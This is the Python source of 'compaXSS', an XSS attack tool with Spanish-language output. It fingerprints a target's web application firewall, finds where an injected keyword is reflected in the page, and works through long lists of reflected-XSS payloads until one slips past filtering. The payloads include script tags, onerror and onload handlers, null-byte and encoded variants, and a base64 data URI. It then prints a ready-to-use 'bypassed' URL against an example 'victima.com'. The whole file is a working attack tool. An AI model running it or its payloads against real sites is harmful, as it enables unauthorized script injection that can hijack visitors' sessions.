#!/usr/bin/env python
# -*- coding: utf-8 -*-
#
#       
#         Copyright 2013 @jofpin (Fraph) - @juan_eljach
#
#   <jofpin@gmail.com>    <juan_eljach10@hotmail.com>
#
#
#
######################
import os            #
import sys           #
import urllib        #
import urllib2       #
import re            #
import wafw00f       #####################
from urlparse import urlparse, parse_qs  #
from HTMLParser import HTMLParser        #
from optparse import OptionParser        #                     
##########################################
#
# Core compaXSS
#
URL = " "
keyword = "-run"
refleccion = 0 
parsero = 0
parser = 0
etiquetasabiertas = []                       
etiquetalimpia = ""
validacion = ['input','textarea','img'] 
ignorar = ['html','head','br','header','nav','meta','footer']             
listavacia = []
etiquetaAbierta = []

if "linux" in sys.platform:
    os.system("clear")
elif "win" in sys.platform:
    os.system("cls")
else:
    pass

# Colors
color = {"blue": "\033[94m", "red": "\033[91m", "green": "\033[92m", "white": "\033[0m", "yellow": "\033[93m"}

print color['blue'] + "\t\t#######################|>\033[1;33mCompaXSS\033[94m<|#########################" + color['white']
print color['blue'] + "\t\t#                       Developers                         #" + color['white']
print color['blue'] + "\t\t##\033[91m+\033[94m=>              @jofpin - @juan_eljach              <=\033[91m+\033[94m##" + color['white']
print color['blue'] + "\t\t##\033[91m+\033[94m>\033[92m                        XSS                         \033[94m<\033[91m+\033[94m##" + color['white']
print color['blue'] + "\t\t##\033[91m+\033[94m>                       V1.0                         <\033[91m+\033[94m##" + color['white']
print color['blue'] + "\t\t##\033[91m+\033[94m>         ################################           <\033[91m+\033[94m##" + color['white']
print color['blue'] + "\t\t#            #\033[91m+\033[94m>\033[1;31m   Bypass XSS Reflected   \033[94m<\033[91m+\033[94m#              #" + color['white']
print color['blue'] + "\t\t############################################################\n" + color['white'] 

# Payloads Cross-site scripting (xss) 
vectores = [
    "javascript:alert(0);",
    "javascript:prompt(/compaXSS/.source);var x = prompt;x(0);x(/XSS/.source);x",
    "<object type='text/x-html' data='javascript:prompt(/xss/.source);var x = prompt;x(0);x(/XSS/.source);x'></object>",
    "<script src='data:text/javascript,prompt(/compaXSS/.source);var x = prompt;x(0);x(/XSS/.source);x'></script>",
    "\"/><script>alert(1);</script><img src=x onerror=x.onerror=prompt(0)>",
    "\"/><img src=x onerror=x.onerror=prompt&lpar;/xss/.source&rpar;;confirm(0);alert(1)>",
    "\"/><img src=x onerror=x.onerror=prompt(0)>",
    "<option>'><button><img src=x onerror=alert(0);></button></option>",
    "\"/><svg/onload=alert(/XSS/.source);prompt(String.fromCharCode(88,83,83));prompt(0)>",
    "<script>alert(0);</script>",
    "<svg/onload=prompt(0);>", 
    "<body/onload=&lt;!--&gt;&#10alert(1);prompt(/XSS/.source)>",
    "<img src=`xx:xx` onerror=alert(/XSS/.source);alert(1)>",
    "<marquee/onstart=confirm(/XSS/.source);alert(1)>",
    "<img/src=` onerror=alert(1)>", 
    "<svg/onload=alert(0);prompt(0);>",
    "<scri%00pt>confirm(0);</scri%00pt>",
    "<script>'alert(0)%3B<%2Fscript>",
    "<video src=. onerror=prompt(0)>",
    "<button>'><img src=x onerror=alert(0);></button>",
    "<script>alert(String.fromCharCode(88,83,83));</script>",
    "<svg/onload=prompt(/XSS/.source);prompt(0);confirm(0);alert(0);>",
    "<img src=x onerror=x.onerror=confirm(1);prompt(2);alert(/XSS/.source);prompt(String.fromCharCode(88,83,83))>",
    "<img src=x onerror=x.onerror=m='%22%3E%3Cimg%20src%3Dx%20onerror%3Dx.onerror%3Dprompt%28/xss/.source%29%3E';d=unescape(m);document.write(d);prompt(String.fromCharCode(88,83,83))>"
]

vectorescrazy = [ #Estableciendo la etiqueta Attr  
    "javascript:alert(0);",
    "\"><script>alert(0)</script>",
    "\"><body/onload=&lt;!--&gt;&#10alert(1);prompt(/XSS/.source)>",
    "\"><marquee/onstart=confirm(/XSS/.source);alert(1)>",
    "\"><img src=`xx:xx` onerror=alert(/XSS/.source);alert(1)>",
    "\"><script src='data:text/javascript,prompt(/compaXSS/.source);var x = prompt;x(0);x(/XSS/.source);x'></script>",
    "\"><object type='text/x-html' data='javascript:prompt(/xss/.source);var x = prompt;x(0);x(/XSS/.source);x'></object>",
    "\"\/><option>'><button><img src=x onerror=alert(1);></button></option>",
    "\"><scri%00pt>confirm(0);</scri%00pt>",
    "\"><script>'alert(0)%3B<%2Fscript>",
    "\"><img src=\"x\" onerror=\"alert(0)\"/>",
    "\"><imgsrc=x onerror=alert.onerror=alert(1)>",
    "\"><script>alert(String.fromCharCode(88,83,83));</script>",
    "\"><svg/onload=prompt(/XSS/.source);prompt(0);confirm(0);alert(0);>",
    "'><script>alert(1)</script>",
    "\"><img src=x onerror=x.onerror=confirm(1);prompt(2);alert(/XSS/.source);prompt(String.fromCharCode(88,83,83))>",
    "\"\/><object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4='></object>"
]

vectores2 = [
    "\"/><img src=x onerror=x.onerror=confirm(1);prompt(2);alert(/XSS/.source);prompt(String.fromCharCode(88,83,83))>",
    "\"><script src='data:text/javascript,prompt(/compaXSS/.source);var x = prompt;x(0);x(/XSS/.source);x'></script>",
    "\"/><object type='text/x-html' data='javascript:prompt(/xss/.source);var x = prompt;x(0);x(/XSS/.source);x'></object>",
    "\"/><img/src=` onerror=alert(1)>",
    "\"/><img src=`xx:xx` onerror=alert(/XSS/.source);alert(1)>",
    "\"/><script>'alert(0)%3B<%2Fscript>",
    "\"/><scri%00pt>confirm(0);</scri%00pt>",
    "\"/><marquee/onstart=confirm(/XSS/.source);alert(1)>",
    "\"/><body/onload=&lt;!--&gt;&#10alert(1);prompt(/XSS/.source)>",
    "\"/><img src=x onerror=x.onerror=prompt&lpar;/xss/.source&rpar;;confirm(0);alert(1)>",
    "\"/><svg/onload=alert(/XSS/.source);prompt(String.fromCharCode(88,83,83));prompt(0)>",
    "\"/><script>alert(String.fromCharCode(88,83,83));</script>",
    "\"/><script>alert(0);</script><img src=x onerror=x.onerror=prompt(0)>",
    "\"\/><img src=\"x\" onerror=\"alert(0)\"/>", 
    "\"\/><audio src=x onerror=alert(0)>",
    "\"\/><img/src=` onerror=alert(0)>",
    "\"\/><img src=\"x\" onerror=\"prompt(/XSS/.source)\"/>",
    "\"\/><object data='data:text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4='></object>"
]

def main():
    options_parser = OptionParser()
    options_parser.add_option("--url", dest="url",
                  help="URL a ejecutar", metavar="URL")                                
    (options, args) = options_parser.parse_args()

    if options.url:
        if (keyword not in options.url):
            exit("Algo salio mal.\033[91m :(\033[0m " "\nEjemplo: python compaxss.py --url http://victima.com/?parametro=" + keyword + "\n")
    else:
        exit("Algo salio mal.\033[91m :(\033[0m " "\nEjemplo: python compaxss.py --url http://victima.com/?parametro=" + keyword + "\n")
    global URL
    URL = options.url
    
    print color['yellow'] + "\nTarget: " + color['blue'] + URL 
    url_to_waf = str(raw_input("Especifique el dominio para la deteccion de WAF: " + color['white']))
    if not (url_to_waf.startswith('http://') or url_to_waf.startswith('https://')):
        url_to_waf = 'http://' + url_to_waf
    print url_to_waf
    print "Detectando WAF"
    wafw00f.detector(url_to_waf) 
    print color['yellow'] + "\nObjetivo: " + color['blue'] + URL  
    print color['green'] + "\n[+] Injectando:\033[91m vectores\033[94m...\n" + color['white']
    compaXSS = requesty(URL) 
    
    if(keyword.lower() in compaXSS.lower()):

        global refleccion
        refleccion = compaXSS.lower().count(keyword.lower())
        print color['green'] + "[+] Verificando" + color['white'] + " Respuestas => " + color['yellow']+ str(refleccion) + color['white']
        
    else:
        exit(color['red'] + "CONSEJO: " + color['white'] + "Comprobar el valor o salir de compaXSS.\n")
    
    for niti in range(refleccion):
        print color['blue'] + "\n\nTesting: " + color['white'] + str(niti + 1)
        global parsero
        parsero = niti + 1
        analisis(compaXSS)
        #Las benditas Globales
        global core, cuota, comillasdobles, atributacionATTR, sinAtributoTAG, etiquetaScript, etiquetasabiertas, etiquetaAbierta, parser, etiquetalimpia
        core, etiquetasabiertas, etiquetaAbierta = [], [], []
        cuota, comillasdobles, atributacionATTR, sinAtributoTAG, etiquetaScript = False, False, False, False, False
        parser = 0
        etiquetalimpia = " "
    
    print color['blue'] + "\n\nVectores Bypass:" + color['white']
    for payload in listavacia:
        print payload
    
#Nueva funcion de Verificando datos
def analisis(compaXSS):
    print "\nVerificando la keyword: \033[1;31m" + keyword + color['white']
    location = javascriptHTML(compaXSS)
    if(location == "comment"): #Comprobar si es un form de comentarios
        print "Parece ser un comentario"
        comentarios()
    elif(location == "script_data"):
        print "Datos de script disponibles en etiquetas."
        script()
    elif(location == "html_data"):
        print "Datos de etiquetas en Texto plano"
        datos()
    elif(location == "start_end_tag_attr"):
        print "Datos de etiquetas Vacias."
        orientadoATTR()
    elif(location == "attr"):
        print "Datos de etiquetas HTML"
        datosHTML()

#Funcion Javascript y html
def javascriptHTML(compaXSS):
    parser = HTMLcompa()
    location = ""
    try:
        parser.feed(compaXSS)
    except Exception as e:
        location = str(e)
    except:
        print color['red'] + "ERROR: " + color['white'] + "Algo salio mal, vuelve a ejecutar a compaXSS"
    return location

# Mas y mas funciones
def comprobacionXSS(parametroXSS, comparacion):
    analisisString = "inicio" + parametroXSS + "envio"
    compararString = "inicio" + comparacion + "envio"
    URLweb = URL.replace(keyword, analisisString)
    try:
        respuesta = requesty(URLweb)
    except:
        respuesta = ""
    success = False
    Game0ver = 0
    for m in re.finditer('inicio', respuesta, re.IGNORECASE):
        Game0ver += 1
        if((Game0ver == parsero) and (respuesta[m.start():m.start()+len(compararString)].lower() == compararString.lower())):
            success = True
            break
    return success
    
# requesty
def requesty(kisses):
    try:
        req = urllib2.Request(kisses)
        resp = urllib2.urlopen(req)
        return resp.read()
    except:
        print "\n" + color['red'] + "ERROR: " + color['white']+ "El parametro o la URL es invalida.\n"

#Funcion de XSS en comentarios
def comentarios():
    print color['green'] + "[+]" + color['white'] + " XSS Reflected"
    payload = "--><script>alert(1);</script>"
    if(comprobacionXSS(payload,payload)):
        payload = "--><script>alert(1);</script>"
        if(comprobacionXSS(payload + "<!--",payload+"<!--")):
            payload = "\"><script>var x = prompt;x(0);x(/XSS/.source);x(0);;x(1);</script><'>" 
    else:
        # Limpieza e insertacion de --> <--
        if(comprobacionXSS("-->", "-->")):
            clean = comprobacionXSS("<!--", "<!--")
            found = False
            for pyxss in vectores:
                pyxss = "-->" + pyxss
                if(clean):
                    pyxss = pyxss + "<!--"
                if(comprobacionXSS(urllib.quote_plus(pyxss), pyxss)):
                    payload = pyxss
                    found = True
                    break
            if(not found):
                print color['red'] + "CONSEJO: " + color['white'] + "Verifica manualmente para comprobar la ejecucion del vector."
        else:
            payload = ""
            print color['red'] + "CONSEJO: " + color['white'] + "No es necesario utilizar --> porque no se refleja."
            
    if(payload):
        if(payload not in listavacia):
            listavacia.append(payload)
        print color['green'] + "[+]" + color['white'] + " Posible vector bypass para el parametro:"
        print payload
        print "\033[1;33mBypasseado:\033[0m " + URL.replace(keyword, urllib.quote_plus(payload))

def script():
    print "\nCreo que es mejor utilizar otro metodo para saltarse el XSS"
    
def datos():
    print "\n[Has la prueba en " + color['green'] + "Firefox" + color['white'] + "]"
    payload = "<script>alert(1);</script>"
    if("textarea" in etiquetasabiertas):
        payload = "</textarea>" + payload
    if("title" in etiquetasabiertas):
        payload = "</title>" + payload
    if(comprobacionXSS(payload,payload)):
        payload = payload
    else:
        found = False
        for pyxss in vectores:
                if(comprobacionXSS(urllib.quote_plus(pyxss), pyxss)):
                    payload = pyxss
                    found = True
                    break
        if(not found):
            payload = ""
            print color['red'] + "CONSEJO: " + color['white'] + "Verifica manualmente para comprobar la ejecucion."

    if(payload):
        if(payload not in listavacia):
            listavacia.append(payload)
        print color['green'] + "[+]" + color['white'] + " XSS Reflejado"
        print payload
        print "\033[1;33mBypasseado:\033[0m " + URL.replace(keyword, urllib.quote_plus(payload))

def orientadoATTR():
    print color['yellow'] + "\n[\033[92mVerificando injeccion XSS\033[1;33m]" + color['white']
    payload = "\"/><script>alert(0);</script>"
    if(comprobacionXSS(payload,payload)):
        payload = "\"/><script>alert(0);</script>" + "\"><img src=x onerror=alert.onerror=alert(0)>"
        if(comprobacionXSS(payload+"<br%20x=\"", payload+"<br x=\"")):
            payload = "\"/><img src=x onerror=x.onerror=prompt(0);alert(0)><br x=\""
    else:
        if(comprobacionXSS("/>", "/>")):
            #--> Direfentes derivaciones <!-- "> /"/ <!--
            clean = comprobacionXSS("<br%20x=\"", "<br x=\"")
            found = False
            for pyxss in vectores2:
                if(clean):
                    pyxss = pyxss + "<br attr=\""
                if(comprobacionXSS(urllib.quote_plus(pyxss), pyxss)):
                    payload = pyxss
                    found = True
                    break
            if(not found):
                payload = ""
                print color['red'] + "CONSEJO: " + color['white'] + "Parece que no hubo un bypass, comprueba manualmente."
        else:
            print color['red'] + "MENSAJE:" + color['white'] + " No se puede utilizar /> parece ser solido." #comprobacion de vector javascript:
            invalidez = [
                "\"></" + etiquetalimpia + "><script>alert(0);</script>",
                "><script>alert(1);</script><img src=x onerror=x.onerror=prompt(0)>",
                "\"><svg/onload=prompt(/XSS/.source);prompt(0);confirm(0);alert(0);>",
                "\"><script>alert(String.fromCharCode(88,83,83));</script>",
                "\"><script>'alert(0)%3B<%2Fscript>",
                "javascript:prompt(/xss/.source);",
                "\"/><body/onload=&lt;!--&gt;&#10alert(1);prompt(/XSS/.source)>",
                "\"><object type='text/x-html' data='javascript:prompt(/xss/.source);var x = prompt;x(0);x(/XSS/.source);x'></object>",
                "\"<div><script>alert(0);</script>"
                ]
            found = False
            for pyxss in invalidez:
                if(comprobacionXSS(urllib.quote_plus(pyxss), pyxss)):
                    payload = pyxss
                    found = True
                    break
            if(not found):
                payload = ""
                print color['red'] + "CONSEJO: " + color['white'] + "Verifica manualmente para comprobar la ejecucion."
            
    if(payload):
        if(payload not in listavacia):
            listavacia.append(payload)
        print color['green'] + "MENSAJE: " + color['white'] + "Utiliza el siguiente vector para bypassear el parametro"
        print payload
        print color['yellow'] + "Bypasseado: " + color['white'] + URL.replace(keyword, urllib.quote_plus(payload))

def datosHTML():
    print color['yellow'] + "\n[\033[92mVerificando injeccion XSS\033[1;33m]" + color['white']
    payload = "\"></" + etiquetasabiertas[len(etiquetasabiertas) - 1] + "><script>alert(1);</script>" + "><script>alert(0);</script>"
    if(comprobacionXSS(payload,payload)):
        if(comprobacionXSS(payload + "<" + etiquetasabiertas[len(etiquetasabiertas) - 1] + "%20x=\"", payload + "<" + etiquetasabiertas[len(etiquetasabiertas) - 1] + " x=\"")):
            payload = "\"></" + etiquetasabiertas[len(etiquetasabiertas) - 1] + "><img src=x onerror=x.onerror=prompt(0);alert(0)><script>alert(1);</script><" + etiquetasabiertas[len(etiquetasabiertas) - 1] + " x=\""
    else:
        if(comprobacionXSS("\">", "\">")):
            # Direfentes derivaciones <!-- "> /"/
            clean_str = "<" + etiquetasabiertas[len(etiquetasabiertas) - 1] + " x=\""
            clean = comprobacionXSS("<" + etiquetasabiertas[len(etiquetasabiertas) - 1] + "%20x=\"", clean_str)
            found = False
            for pyxss in vectorescrazy:
                if(clean):
                    pyxss = pyxss + clean_str
                if(comprobacionXSS(urllib.quote_plus(pyxss), pyxss)):
                    payload = pyxss
                    found = True
                    break
            if(not found):
                payload = ""
                print color['red'] + "CONSEJO: " + color['white'] + "Verifica manualmente el vector, para comprobar la ejecucion"
        else:
            print color['red'] + "[+]" + color['white'] + " No se puede utilizar \"> parece ser solido."
            invalidez = [
                "\"<div><script>alert(0);</script>",
                "\"<script>confirm(0);prompt(2);alert(/XSS/.source)</script>",
                "\"</><script>alert(0)</script>",
                "\"<><img src=\"x\" onerror=\"alert(0)\"/>",
                "\"/><body/onload=&lt;!--&gt;&#10alert(1);prompt(/XSS/.source)>",
                "\"><object type='text/x-html' data='javascript:prompt(/xss/.source);var x = prompt;x(0);x(/XSS/.source);x'></object>",
                "\"<img src=x onerror=x.onerror=prompt(/XSS/.source);confirm(1);alert(2);prompt(3);alert(4);alert(4);prompt('xss')>"
                ]
            found = False
            for pyxss in invalidez:
                if(comprobacionXSS(urllib.quote_plus(pyxss), pyxss)):
                    payload = pyxss
                    found = True
                    break
            if(not found):
                payload = ""
                print color['red'] + "CONSEJO: " + color['white'] + "Verifica manualmente para comprobar la ejecucion"
              
    if(payload):
        if(payload not in listavacia):
            listavacia.append(payload)
        print color['green'] + "MENSAJE: " + color['white'] + "Verifica la importancia del Bypass o sal de la tool."
        print payload
        print color['yellow'] + "Bypasseado: " + color['white'] + URL.replace(keyword, urllib.quote_plus(payload))
        
# Clase HTMLcompa comprobacion de Datos
class HTMLcompa(HTMLParser):
    def handle_comment(self, data):
        global parser
        if(keyword.lower() in data.lower()):
            parser += 1
            if(parser == parsero):
                raise Exception("comment")
    
    def handle_startendtag(self, tag, attrs):
        global parser
        global parsero
        global etiquetalimpia
        if (keyword.lower() in str(attrs).lower()):
            parser += 1
            if(parser == parsero):
                OPEN_EMPTY_TAG = tag
                raise Exception("start_end_tag_attr")
            
    def handle_starttag(self, tag, attrs):
        global etiquetasabiertas
        global etiquetaAbierta
        global parser
        if(tag not in ignorar):
            etiquetasabiertas.append(tag)
        if (keyword.lower() in str(attrs).lower()):
            if(tag == "script"):
                parser += 1
                if(parser == parsero):
                    raise Exception("script")
            else:
                parser += 1
                if(parser == parsero):
                    raise Exception("attr")

    def handle_endtag(self, tag):
        global etiquetasabiertas
        global etiquetaAbierta
        global parser
        if(tag not in ignorar):
            etiquetasabiertas.remove(tag)
            
    def handle_data(self, data):
        global parser
        if (keyword.lower() in data.lower()):
            parser += 1
            if(parser == parsero):
 
                try:
                    
                    if(etiquetasabiertas[len(etiquetasabiertas)-1] == "script"):
                        raise Exception("script_data")
                    else:
                        raise Exception("html_data")
                except:
                    raise Exception("html_data")

if __name__ == "__main__":
    main()
